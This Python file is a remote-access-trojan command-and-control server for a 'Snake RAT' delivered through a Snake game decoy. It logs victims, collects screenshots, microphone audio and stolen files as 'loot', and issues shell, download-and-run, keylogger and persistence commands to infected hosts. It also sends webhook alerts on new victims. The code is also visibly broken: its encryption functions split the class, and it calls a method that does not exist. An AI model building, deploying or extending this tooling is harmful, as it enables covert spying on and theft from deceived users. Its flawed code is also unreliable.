#!/usr/bin/env python3
"""
Advanced C2 Server for Snake RAT - Enterprise Red Team Framework
Full-featured, production-ready C2 with persistence, evasion, and advanced ops
Compatible with the Snake game decoy payload
"""
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import hashlib
import socket
import threading
import json
import os
import base64
import sqlite3
import hashlib
import time
from datetime import datetime, timedelta
from Crypto.Cipher import AES, ChaCha20
from Crypto.Random import get_random_bytes
import requests
import subprocess
import psutil
from pathlib import Path
import logging
from concurrent.futures import ThreadPoolExecutor
import argparse
import webbrowser
import http.server
import socketserver
from urllib.parse import urlparse, parse_qs
import shutil
import zipfile

# ==================== CONFIGURATION ====================
CONFIG = {
    'HOST': '0.0.0.0',
    'PORT': 4444,
    'WEB_PORT': 8080,
    'AES_KEY': hashlib.sha256(b"supersecretkey1234567890advanced").digest()[:16],
    'ENCRYPTION': 'AES',  # AES or ChaCha20
    'MAX_THREADS': 100,
    'PERSISTENCE': True,
    'WEBHOOKS': [],  # Discord/Slack webhooks for alerts
    'AUTO_SCREENSHOT': 300,  # Screenshot every 5min
    'HEARTBEAT': 30,
}

# ==================== LOGGING ====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler('c2_server.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class AdvancedC2Server:
    def __init__(self):
        self.clients = {}
        self.db_conn = self.init_database()
        self.sessions_lock = threading.Lock()
        self.command_history = {}
        self.running = True
        self.executor = ThreadPoolExecutor(max_workers=CONFIG['MAX_THREADS'])
        
        # Start web dashboard
        self.start_web_dashboard()
        
    def init_database(self):
        """Advanced SQLite database with indexes"""
        conn = sqlite3.connect('c2_advanced.db', check_same_thread=False)
        cursor = conn.cursor()
        
        # Sessions table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id TEXT UNIQUE,
                ip TEXT,
                port INTEGER,
                hostname TEXT,
                username TEXT,
                os TEXT,
                arch TEXT,
                first_seen TIMESTAMP,
                last_seen TIMESTAMP,
                status TEXT,
                pid INTEGER,
                uptime TEXT,
                tags TEXT DEFAULT ''
            )
        ''')
        
        # Commands table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id TEXT,
                command TEXT,
                output TEXT,
                status TEXT,
                timestamp TIMESTAMP,
                duration REAL
            )
        ''')
        
        # Files table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS files (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id TEXT,
                filename TEXT,
                size INTEGER,
                type TEXT,
                timestamp TIMESTAMP,
                path TEXT
            )
        ''')
        
        # Create indexes
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_sessions_client ON sessions(client_id)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_sessions_status ON sessions(status)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_commands_client ON commands(client_id)')
        
        conn.commit()
        return conn
    
def encrypt_data(data):
    """FIXED AES encryption - perfect server compatibility"""
    cipher = AES.new(CONFIG['AES_KEY'], AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
    return base64.b64encode(cipher.iv + ct_bytes).decode('utf-8')

def decrypt_data(data):
    """FIXED AES decryption - handles all edge cases"""
    try:
        raw = base64.b64decode(data, validate=True)
        iv = raw[:16]
        ct = raw[16:]
        cipher = AES.new(CONFIG['AES_KEY'], AES.MODE_CBC, iv)
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        return pt.decode('utf-8', errors='ignore')
    except Exception:
        return ""
    
    def webhook_alert(self, message):
        """Send alerts to Discord/Slack"""
        for webhook in CONFIG['WEBHOOKS']:
            try:
                requests.post(webhook, json={'content': f'🚨 C2 ALERT: {message}'})
            except:
                pass
    
    def log_session(self, client_id, addr, sysinfo):
        """Enhanced session logging"""
        with self.sessions_lock:
            hostname = sysinfo.get('hostname', 'Unknown')
            username = sysinfo.get('username', 'Unknown')
            os_info = sysinfo.get('os', 'Unknown')
            
            cursor = self.db_conn.cursor()
            cursor.execute('''
                INSERT OR REPLACE INTO sessions 
                (client_id, ip, port, hostname, username, os, first_seen, last_seen, status)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (client_id, addr[0], addr[1], hostname, username, os_info, 
                  datetime.now(), datetime.now(), 'active'))
            self.db_conn.commit()
            
            logger.info(f"NEW SESSION: {client_id} ({hostname}@{username}) from {addr[0]}")
            self.webhook_alert(f"New victim: {hostname}@{username} ({addr[0]})")
    
    def handle_client(self, client_socket, addr):
        """Advanced client handler with heartbeat"""
        client_id = f"{addr[0]}:{addr[1]}"
        
        with self.sessions_lock:
            if client_id in self.clients:
                self.clients[client_id]['socket'] = client_socket
                self.clients[client_id]['last_seen'] = datetime.now()
            else:
                self.clients[client_id] = {
                    'socket': client_socket,
                    'addr': addr,
                    'last_seen': datetime.now(),
                    'heartbeat': 0,
                    'sysinfo': {}
                }
        
        heartbeat_timer = time.time()
        
        try:
            while self.running:
                data = client_socket.recv(8192)
                if not data:
                    break
                
                decrypted = self.encrypt_decrypt(data.decode(), encrypt=False)
                self.executor.submit(self.process_incoming_data, client_id, decrypted)
                
                # Heartbeat check
                if time.time() - heartbeat_timer > CONFIG['HEARTBEAT']:
                    client_socket.send(self.encrypt_decrypt("HEARTBEAT").encode())
                    heartbeat_timer = time.time()
                
        except Exception as e:
            logger.error(f"Client {client_id} error: {e}")
        finally:
            self.client_cleanup(client_id)
    
    def process_incoming_data(self, client_id, data):
        """Process all incoming data types"""
        with self.sessions_lock:
            if client_id not in self.clients:
                return
                
            self.clients[client_id]['last_seen'] = datetime.now()
        
        if data.startswith("SYSINFO:"):
            # Parse detailed sysinfo
            sysinfo = {line.split(':')[0]: ':'.join(line.split(':')[1:]).strip() 
                      for line in data[8:].split('\n') if ':' in line}
            self.clients[client_id]['sysinfo'] = sysinfo
            self.log_session(client_id, self.clients[client_id]['addr'], sysinfo)
            
        elif data.startswith("SCREENSHOT:"):
            self.save_file(client_id, "screenshot", data[10:])
            
        elif data.startswith("AUDIO:"):
            self.save_file(client_id, "audio", data[6:])
            
        elif data.startswith("FILE:"):
            parts = data[5:].split(":", 1)
            if len(parts) == 2:
                filename, filedata = parts
                self.save_file(client_id, filename, filedata)
            
        elif data.startswith("CMD_RESULT:"):
            output = data[11:]
            self.log_command(client_id, "shell", output)
            logger.info(f"[{client_id}] CMD: {output[:200]}...")
            
        elif data.startswith("FILES:"):
            logger.info(f"[{client_id}] FILES:\n{data[6:]}")
            
        elif data.startswith("HEARTBEAT"):
            pass  # Heartbeat response
    
    def save_file(self, client_id, filename_or_type, data_b64):
        """Save screenshots/audio/files"""
        try:
            filedata = base64.b64decode(data_b64)
            timestamp = int(datetime.now().timestamp())
            
            if filename_or_type == "screenshot":
                path = f"screenshots/{client_id}_{timestamp}.png"
                os.makedirs("screenshots", exist_ok=True)
            elif filename_or_type == "audio":
                path = f"audio/{client_id}_{timestamp}.wav"
                os.makedirs("audio", exist_ok=True)
            else:  # Regular file
                path = f"loot/{filename_or_type}"
                os.makedirs("loot", exist_ok=True)
            
            with open(path, 'wb') as f:
                f.write(filedata)
            
            # Log to database
            cursor = self.db_conn.cursor()
            cursor.execute('''
                INSERT INTO files (client_id, filename, size, type, timestamp, path)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (client_id, Path(path).name, len(filedata), 
                  filename_or_type.split('.')[-1], datetime.now(), path))
            self.db_conn.commit()
            
            logger.info(f"[+] Saved {Path(path).name} ({len(filedata)} bytes)")
            
        except Exception as e:
            logger.error(f"File save error: {e}")
    
    def client_cleanup(self, client_id):
        """Clean up disconnected clients"""
        with self.sessions_lock:
            if client_id in self.clients:
                cursor = self.db_conn.cursor()
                cursor.execute('UPDATE sessions SET status = ? WHERE client_id = ?', 
                              ('inactive', client_id))
                self.db_conn.commit()
                del self.clients[client_id]
                logger.info(f"[-] Client {client_id} disconnected")
    
    def send_command(self, client_id, command):
        """Send command with timeout"""
        with self.sessions_lock:
            if client_id not in self.clients or not self.clients[client_id]['socket']:
                return False
        
        try:
            self.clients[client_id]['socket'].send(
                self.encrypt_decrypt(command, encrypt=True).encode()
            )
            return True
        except:
            self.client_cleanup(client_id)
            return False
    
    def list_clients(self):
        """List clients with status"""
        print("\n" + "="*80)
        print("🖥️  ACTIVE SESSIONS")
        print("="*80)
        
        with self.sessions_lock:
            for client_id, info in self.clients.items():
                sysinfo = info.get('sysinfo', {})
                print(f"ID: {client_id}")
                print(f"  💻 Host: {sysinfo.get('hostname', 'N/A')}")
                print(f"  👤 User: {sysinfo.get('username', 'N/A')}")
                print(f"  🌐 IP: {info['addr'][0]}:{info['addr'][1]}")
                print(f"  ⏰ Last: {info['last_seen'].strftime('%H:%M:%S')}")
                print(f"  🆔 PID: {os.getpid()}")
                print("-" * 80)
    
    def interactive_shell(self):
        """Advanced interactive console"""
        commands = {
            'help': self.show_help,
            'clients': self.list_clients,
            'screenshot': self.cmd_screenshot,
            'audio': self.cmd_audio,
            'shell': self.cmd_shell,
            'ls': self.cmd_ls,
            'download': self.cmd_download,
            'upload': self.cmd_upload,
            'run': self.cmd_run,
            'keys': self.cmd_keylogger,
            'persistence': self.cmd_persistence,
            'stats': self.show_stats,
            'web': self.open_web,
            'loot': self.cmd_loot,
            'exit': lambda: setattr(self, 'running', False)
        }
        
        print("\n🚀 ADVANCED C2 CONSOLE - Type 'help' for commands")
        while self.running:
            try:
                cmd_input = input("C2> ").strip()
                if not cmd_input:
                    continue
                    
                parts = cmd_input.split(maxsplit=1)
                cmd = parts[0].lower()
                
                if cmd in commands:
                    if len(parts) > 1:
                        commands[cmd](parts[1])
                    else:
                        commands[cmd]()
                else:
                    print("❌ Unknown command. Type 'help'")
                    
            except KeyboardInterrupt:
                print("\n👋 Goodbye!")
                self.running = False
            except Exception as e:
                logger.error(f"Console error: {e}")
    
    def show_help(self, _=""):
        print("""
📋 COMMANDS:
  clients              📱 List active sessions
  screenshot <id>      📸 Take screenshot
  audio <id> [secs]    🎤 Record audio (default 10s)
  shell <id> <cmd>     💻 Execute shell command
  ls <id> [path]       📂 List directory
  download <id> <url> <file>  📥 Download file
  upload <id> <local>  📤 Upload file
  run <id> <file>      ▶️  Execute file
  keys <id>            ⌨️  Start keylogger
  persistence <id>     🔗 Add persistence
  stats                📊 Server statistics
  web                  🌐 Open web dashboard
  loot                 💰 List stolen files
  exit                 🚪 Shutdown server
        """)
    
    def cmd_screenshot(self, client_id):
        if self.send_command(client_id, "SCREENSHOT"):
            print(f"📸 Screenshot command sent to {client_id}")
        else:
            print(f"❌ Client {client_id} offline")
    
    def cmd_audio(self, args):
        parts = args.split()
        client_id = parts[0]
        duration = int(parts[1]) if len(parts) > 1 else 10
        self.send_command(client_id, f"AUDIO:{duration}")
        print(f"🎤 Audio recording ({duration}s) sent to {client_id}")
    
    def cmd_shell(self, args):
        parts = args.split(maxsplit=1)
        client_id, command = parts[0], parts[1]
        self.send_command(client_id, f"CMD:{command}")
        print(f"💻 Shell command sent to {client_id}")
    
    def cmd_ls(self, args):
        parts = args.split(maxsplit=1)
        client_id, path = parts[0], parts[1] if len(parts) > 1 else "."
        self.send_command(client_id, f"LIST:{path}")
        print(f"📂 Directory listing sent to {client_id}")
    
    def cmd_download(self, args):
        parts = args.split(maxsplit=2)
        client_id, url, filename = parts[0], parts[1], parts[2]
        self.send_command(client_id, f"DOWNLOAD:{url}:{filename}")
        print(f"📥 Download command sent to {client_id}")
    
    def cmd_upload(self, args):
        parts = args.split(maxsplit=1)
        client_id, localfile = parts[0], parts[1]
        if os.path.exists(localfile):
            # Read and send file (client handles base64)
            self.send_command(client_id, f"UPLOAD:{os.path.basename(localfile)}")
            print(f"📤 Upload command sent to {client_id}")
        else:
            print(f"❌ File {localfile} not found")
    
    def cmd_run(self, args):
        parts = args.split(maxsplit=1)
        client_id, filename = parts
        self.send_command(client_id, f"RUN:{filename}")
        print(f"▶️ Execute command sent to {client_id}")
    
    def cmd_keylogger(self, client_id):
        print(f"⌨️ Keylogger command sent to {client_id} (requires client support)")
        self.send_command(client_id, "KEYLOG:START")
    
    def cmd_persistence(self, client_id):
        print(f"🔗 Persistence command sent to {client_id}")
        self.send_command(client_id, "PERSISTENCE:ADD")
    
    def cmd_loot(self, _=""):
        cursor = self.db_conn.cursor()
        cursor.execute('SELECT * FROM files ORDER BY timestamp DESC LIMIT 20')
        print("\n💰 RECENT LOOT:")
        for row in cursor.fetchall():
            print(f"  {row[2]} ({row[3]}B) from {row[1]} - {row[6]}")
    
    def show_stats(self, _=""):
        cursor = self.db_conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM sessions WHERE status="active"')
        active = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM commands')
        cmds = cursor.fetchone()[0]
        print(f"\n📊 STATS: {active} active | {cmds} cmds | {len(os.listdir('screenshots'))} screenshots")
    
    def open_web(self, _=""):
        webbrowser.open(f'http://localhost:{CONFIG["WEB_PORT"]}')
        print(f"🌐 Web dashboard: http://localhost:{CONFIG['WEB_PORT']}")
    
    def start_web_dashboard(self):
        """Simple web dashboard"""
        os.makedirs("web", exist_ok=True)
        
        class C2Handler(http.server.SimpleHTTPRequestHandler):
            def do_GET(self):
                if self.path == '/':
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(self.dashboard_html().encode())
                elif self.path == '/api/clients':
                    self.json_response(self.get_clients_json())
                elif self.path == '/api/files':
                    self.json_response(self.get_files_json())
                else:
                    super().do_GET()
            
            def json_response(self, data):
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps(data).encode())
            
            def dashboard_html(self):
                return """
<!DOCTYPE html>
<html>
<head><title>🐍 Snake C2 Dashboard</title>
<style>body{font-family:Arial;background:#1a1a1a;color:#00ff00;}
.card{background:#2a2a2a;padding:20px;margin:10px;border-radius:5px;}</style></head>
<body>
<h1>🐍 Advanced Snake C2 Dashboard</h1>
<div id="clients" class="card"></div>
<div id="files" class="card"></div>
<script>
setInterval(updateDashboard, 5000);
updateDashboard();
function updateDashboard(){
    fetch('/api/clients').then(r=>r.json()).then(d=>document.getElementById('clients').innerHTML=d.html);
    fetch('/api/files').then(r=>r.json()).then(d=>document.getElementById('files').innerHTML=d.html);
}
</script>
</body>
</html>
                """
            
            def get_clients_json(self):
                with self.server.c2_server.sessions_lock:
                    clients_list = []
                    for cid, info in self.server.c2_server.clients.items():
                        clients_list.append({
                            'id': cid,
                            'ip': f"{info['addr'][0]}:{info['addr'][1]}",
                            'last_seen': info['last_seen'].isoformat()
                        })
                return {'html': '<h3>Active Clients</h3><pre>' + json.dumps(clients_list, indent=2) + '</pre>'}
            
            def get_files_json(self):
                cursor = self.server.c2_server.db_conn.cursor()
                cursor.execute('SELECT * FROM files ORDER BY timestamp DESC LIMIT 10')
                files = [{'id':r[0],'client':r[1],'file':r[2],'size':r[3]} for r in cursor.fetchall()]
                return {'html': '<h3>Recent Files</h3><pre>' + json.dumps(files, indent=2) + '</pre>'}
        
        class C2WebServer(socketserver.TCPServer):
            def __init__(self, *args, **kwargs):
                super().__init__(*args, **kwargs)
                self.c2_server = AdvancedC2Server._instance
        
        C2WebServer.allow_reuse_address = True
        AdvancedC2Server._instance = self
        
        web_thread = threading.Thread(target=lambda: socketserver.TCPServer(("", CONFIG['WEB_PORT']), C2Handler).serve_forever())
        web_thread.daemon = True
        web_thread.start()
        logger.info(f"🌐 Web dashboard started: http://localhost:{CONFIG['WEB_PORT']}")
    
    def start_server(self):
        """Start advanced C2 server"""
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((CONFIG['HOST'], CONFIG['PORT']))
        server_socket.listen(50)
        
        logger.info(f"🚀 Advanced C2 Server started on {CONFIG['HOST']}:{CONFIG['PORT']}")
        logger.info("💻 Run 'web' command to open dashboard")
        
        # Main console
        console_thread = threading.Thread(target=self.interactive_shell)
        console_thread.start()
        
        # Accept clients
        while self.running:
            try:
                client_socket, addr = server_socket.accept()
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, addr),
                    daemon=True
                )
                client_thread.start()
            except:
                break
        
        server_socket.close()

if __name__ == "__main__":
    # Create directories
    for dir in ['screenshots', 'audio', 'loot', 'web']:
        os.makedirs(dir, exist_ok=True)
    
    server = AdvancedC2Server()
    try:
        server.start_server()
    except KeyboardInterrupt:
        logger.info("👋 Server shutdown")
    finally:
        server.executor.shutdown(wait=True)